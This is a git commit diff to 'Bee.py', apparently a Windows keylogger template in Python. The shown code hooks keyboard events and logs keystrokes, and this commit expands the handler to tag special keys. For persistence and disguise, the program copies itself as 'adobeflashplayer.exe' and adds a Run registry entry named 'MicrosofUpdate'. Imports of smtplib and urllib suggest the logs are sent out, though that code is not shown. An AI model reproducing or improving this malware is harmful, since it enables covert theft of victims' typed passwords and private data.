3e3c6588f6c15bf757fed8c6d013d2fce7cb3a49
Alisson Moretto <4w4k3@protonmail.com>
2017-03-08 08:25:26 -0300

    Update Bee.py

--- Templates/Bee.py
+++ Templates/Bee.py
@@ -1,6 +1,9 @@
-import pythoncom, pyHook
-import os
-import sys
+import pythoncom
+import pyHook
+from os import path
+from sys import exit
+from sys import argv
+from shutil import copy
 import threading
 import urllib,urllib2
 import smtplib
@@ -9,11 +12,11 @@ import win32com.client
 import win32event, win32api, winerror
 from _winreg import *
 
-mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
+mutex = win32event.CreateMutex(None, 1, 'N0tAs519ns')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    print "..."
-    sys.exit(0)
+    print "err"
+    exit(0)
 x=''
 data=''
 count=0
@@ -21,11 +24,11 @@ count=0
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
 
 def startup():
-    shutil.copy(sys.argv[0],dir)
+    copy(argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
     SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
-if os.path.isfile(dir) == False:
+if path.isfile(dir) == False:
     startup()	
 
 class TimerClass(threading.Thread):
@@ -75,11 +78,35 @@ if __name__ == '__main__':
 def pushing(event):
     global x,data
     if event.Ascii==13:
-        e4Ch='<ENTER>'
+        e4Ch=' [ENTER] '
     elif event.Ascii==8:
-        e4Ch='<BACK SPACE>'
-    elif event.Ascii==9:
-        e4Ch='<TAB>'
+        e4Ch=' [BACKSPACE] '
+    elif (event.Ascii == 162 or event.Ascii == 163):
+        e4Ch = ' [CTRL] '
+    elif (event.Ascii == 164 or event.Ascii == 165):
+        e4Ch = ' [ALT] '
+    elif (event.Ascii == 160 or event.Ascii == 161):
+        e4Ch = ' [SHIFT] '
+    elif (event.Ascii == 46):
+        e4Ch = ' [DELETE] '
+    elif (event.Ascii == 32):
+        e4Ch = ' [SPACE] '
+    elif (event.Ascii == 27):
+        e4Ch = ' [ESC] '
+    elif (event.Ascii == 9):
+        e4Ch = ' [TAB] '
+    elif (event.Ascii == 20):
+        e4Ch = ' [CAPSLOCK] '
+    elif (event.Ascii == 38):
+        e4Ch = ' [UP] '
+    elif (event.Ascii == 40):
+        e4Ch = ' [DOWN] '
+    elif (event.Ascii == 37):
+        e4Ch = ' [LEFT] '
+    elif (event.Ascii == 39):
+        e4Ch = ' [RIGHT] '
+    elif (event.Ascii == 91):
+        e4Ch = ' [SUPER] '
     else:
         e4Ch=chr(event.Ascii)
     data=data+e4Ch 
